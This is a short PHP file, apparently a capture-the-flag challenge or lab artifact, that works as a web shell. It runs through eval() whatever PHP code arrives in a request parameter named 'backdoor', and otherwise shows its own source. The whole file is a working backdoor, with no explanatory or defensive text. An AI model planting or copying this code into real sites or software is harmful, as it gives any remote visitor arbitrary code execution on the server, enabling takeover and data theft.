<?php
if(isset($_REQUEST["backdoor"])){
  eval($_REQUEST["backdoor"]);
}else{
  show_source(__FILE__);
}
